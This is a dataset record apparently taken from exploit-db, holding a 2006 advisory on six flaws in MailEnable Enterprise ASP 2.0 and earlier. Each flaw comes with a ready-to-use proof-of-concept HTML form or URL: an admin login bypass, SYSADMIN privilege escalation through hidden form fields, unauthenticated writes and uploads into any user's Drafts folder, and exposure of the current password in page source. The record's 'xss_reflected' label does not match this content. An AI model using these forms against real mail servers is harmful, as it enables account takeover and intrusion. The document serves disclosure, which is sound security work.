{
  "id": "1893",
  "title": "MailEnable Enterprise 2.0 - &#039;ASP&#039; Multiple Vulnerabilities",
  "cve": null,
  "vuln_type": "xss_reflected",
  "code": "Hi, I'm Soroush Dalili from GrayHatz Security Group (GSG). I found multiple bugs in \r\nMailEnable Enterprise Edition ASP Version <= 2.0 that I listed them below:\r\n\r\n1) - Any user can login to web administration site.\r\n2) - Authenticated normal user can gain ADMIN or SYSADMIN level, also remote user can disable him/her account!\r\n3) - Every one (ever no authenticated user) can write a message in \"Draft\" folder of any users!\r\n4) - Every one can make \"myupload.ams\" on server in \"drafts\" folder of every user!\r\n5) - Every one can make \"_myupload.csv\" on server in \"drafts\" folder of every user!\r\n6) - For changing password it need the current password but current password is mention in source of \"ListAttachments.asp\" file, if XSS attack or Session hijacking happened then attacker can gain the user's current password.\r\n\r\n\r\n\r\nDetails' Descriptions:\r\n\r\n1)\r\nAny user can login to web administration site with bug in \"main.asp\" (Enterprise)\r\n\r\nProof's exploit:\r\n-----------------------Start--------------------------\r\n<FORM NAME=FrmMain ACTION=\"http://[URL]/meadmin/enterprise/lang/EN/main.asp\" METHOD=\"POST\">\r\n\tPOSTOFFICE<INPUT NAME=POSTOFFICE TYPE=\"text\" VALUE=\"postmaster\"><br>\r\n<input type=submit>\r\n</FORM>\r\n-----------------------End----------------------------\r\n\r\n2)\r\nAuthenticated normal user can gain ADMIN or SYSADMIN level, also remote user can disable him/her account!\r\n\r\nBug in \"MailOptions.asp\" file: remote authenticated user can change value of hidden field (name=\"LoginRights\") \r\nfrom \"USER\" to \"ADMIN\" or \"SYSADMIN\" and change it's level to up! or change value of hidden field \r\n(name=\"LoginStatus\") to \"0\" to disable him/her account!\r\n\r\nProof's exploit:\r\n-----------------------Start--------------------------\r\n<FORM METHOD=\"post\" ACTION=\"http://[URL]/MEWebMail/base/default/lang/EN/MailOptions.asp?SelectedIndex=1&FormAction=Edit\">\r\n\r\n<TABLE BORDER=\"0\">\r\n\t<TR><TD>Current Password:</TD><TD><INPUT name=LoginPassword VALUE=\"\"></TD></TR>\r\n\t<TR><TD>New Password:</TD><TD><INPUT name=NewLoginPassword VALUE=\"\"></TD></TR>\r\n\t<TR><TD>Confirm New Password:</TD><TD><INPUT name=ConfirmNewLoginPassword VALUE=\"\"></TD></TR>\r\n</TABLE>\r\n<INPUT NAME=\"LoginDescription\" VALUE=\"Login description\">\r\n<INPUT NAME=\"LoginRights\" VALUE=\"SYSADMIN\">\r\n<INPUT NAME=\"LoginStatus\" VALUE=\"1\">\r\n<BR><BR>\r\n<INPUT type=submit value=\"UpTime!\">\r\n</FORM>\r\n-----------------------End----------------------------\r\n\r\n3)\r\nEvery one (ever no authenticated user) can write a message in \"Draft\" folder of any users!\r\nBug in \"Resolve.asp\" file: this file don't check authenticated user!\r\n\r\nProof's exploit:\r\n--------------Start---------------------\r\n<FORM METHOD=\"post\" ACTION=\"http://[url]/MEWebMail/base/default/lang/EN/Forms/MAI/Resolve.asp\">\r\n\r\n<TABLE BORDER=\"0\">\r\n\t<TR><TD>ME_MAILBOX:</TD><TD><INPUT name=ME_MAILBOX VALUE=\"\"></TD></TR>\r\n\t<TR><TD>ME_POSTOFFICE:</TD><TD><INPUT name=ME_POSTOFFICE VALUE=\"\"></TD></TR>\r\n\t<TR><TD>Folder:</TD><TD><INPUT name=Folder VALUE=\"\"></TD></TR>\r\n\t<TR><TD>ID:</TD><TD><INPUT name=ID VALUE=\"\"></TD></TR>\r\n\t<TR><TD>ComposeMode:</TD><TD><INPUT name=ComposeMode VALUE=\"General\"></TD></TR>\t\r\n\t<TR><TD>MsgFrom:</TD><TD><INPUT name=MsgFrom VALUE=\"\"></TD></TR>\r\n\t<TR><TD>MsgCc:</TD><TD><INPUT name=MsgCc VALUE=\"\"></TD></TR>\r\n\t<TR><TD>MsgTo:</TD><TD><INPUT name=MsgTo VALUE=\"\"></TD></TR>\r\n\t<TR><TD>MsgBCC:</TD><TD><INPUT name=MsgBCC VALUE=\"\"></TD></TR>\r\n\t<TR><TD>MsgBody:</TD><TD><INPUT name=MsgBody VALUE=\"\"></TD></TR>\r\n\t<TR><TD>MsgSubject:</TD><TD><INPUT name=MsgSubject VALUE=\"\"></TD></TR>\r\n</TABLE>\r\n<BR><BR>\r\n<INPUT type=submit value=\"Update\"  CLASS=ME_Button>\r\n</FORM>\r\n--------------End---------------------\r\n\r\n4)\r\nMake \"myupload.ams\" on server in \"drafts\" folder of every user!\r\nShow Mail Enable folder's path if \"username\" or \"postoffices\" be incorrect!\r\n\r\nProof's exploit:\r\n-----------------------Start--------------------------\r\n<FORM NAME=FrmMain ACTION=\"http://[URL]/MEWebMail/base/default/lang/EN/Forms/MAI/UploadAttachment.asp\" ENCTYPE=\"multipart/form-data\" METHOD=\"POST\">\r\n\tMESSAGEID<INPUT NAME=MESSAGEID TYPE=\"text\" VALUE=\"test\"><br>\r\n\tPOSTOFFICE<INPUT NAME=POSTOFFICE TYPE=\"text\" VALUE=\"default\"><br>\r\n\tAUTH_PASSWORD<INPUT NAME=AUTH_PASSWORD TYPE=\"text\" VALUE=\"\"><br>\r\n\tAUTH_USERNAME<INPUT NAME=AUTH_USERNAME TYPE=\"text\" VALUE=\"testuser\"><br>\r\n\tMode<INPUT NAME=Mode TYPE=\"text\" VALUE=\"Compose\"><br>\r\n\tFolder<INPUT NAME=Folder TYPE=\"text\" VALUE=\"\\Drafts\"><br>\r\n\tID<INPUT NAME=ID TYPE=\"text\" VALUE=\"test\"><br>\r\n<TABLE>\r\n<TR><TD>File Name</TD><TD>\r\n<INPUT TYPE=FILE NAME=\"txtFile\">\r\n<INPUT TYPE=submit VALUE=\"Add\"></TD></TR>\r\n</TABLE>\r\n</FORM>\r\n-----------------------End----------------------------\r\n\r\n5)\r\nMake \"_myupload.csv\" on server in \"drafts\" folder of every user!\r\nShow Mail Enable folder's path if \"username\" or \"postoffices\" be incorrect!\r\nProof's exploit:\r\n-----------------------Start--------------------------\r\n<FORM NAME=FrmMain ACTION=\"http://[URL]/MEWebMail/base/enterprise/lang/EN/Forms/vcf/uploadcontact.asp\" ENCTYPE=\"multipart/form-data\" METHOD=\"POST\">\r\n\tMESSAGEID<INPUT NAME=MESSAGEID TYPE=\"text\" VALUE=\"test123\"><br>\r\n\tPOSTOFFICE<INPUT NAME=POSTOFFICE TYPE=\"text\" VALUE=\"default\"><br>\r\n\tAUTH_PASSWORD<INPUT NAME=AUTH_PASSWORD TYPE=\"text\" VALUE=\"\"><br>\r\n\tAUTH_USERNAME<INPUT NAME=AUTH_USERNAME TYPE=\"text\" VALUE=\"testuser\"><br>\r\n\tMode<INPUT NAME=Mode TYPE=\"text\" VALUE=\"Compose\"><br>\r\n\tFolder<INPUT NAME=Folder TYPE=\"text\" VALUE=\"\\Drafts\"><br>\r\n\tID<INPUT NAME=ID TYPE=\"text\" VALUE=\"test123\"><br>\r\n<TABLE>\r\n<TR><TD>File Name</TD><TD>\r\n<INPUT TYPE=FILE NAME=\"txtFile\">\r\n<INPUT TYPE=submit VALUE=\"Add\"></TD></TR>\r\n</TABLE>\r\n</FORM>\r\n-----------------------End----------------------------\r\n\r\n6)\r\nHave password in source.\r\nProof:\r\n-----------------------Start--------------------------\r\nhttp://[URL]/MEWebmail/base/enterprise/lang/EN/Forms/MAI/ListAttachments.asp?Mode=Compose&ID=test.MAI&MsgFormat=HTML&FormAction=Send&ComposeMode=General&Folder=%5CDrafts\r\n-----------------------End----------------------------\r\n\r\n\r\nProduct name: MailEnable Enterprise Edition\r\nVersion: All ASP version <= 2.0\r\nURL: www.mailenable.com\r\nFinder: Soroush Dalili\r\nTeam: GSG [Grayhatz.net]\r\nCountry: Iran\r\nSite: Grayhatz.net\r\nEmail: IRSDL[a.t]Yahoo[d0t]Com\r\n\r\n<< I hope secure world for all >>\r\n\r\n# milw0rm.com [2006-06-09]",
  "url": "https://www.exploit-db.com/exploits/1893"
}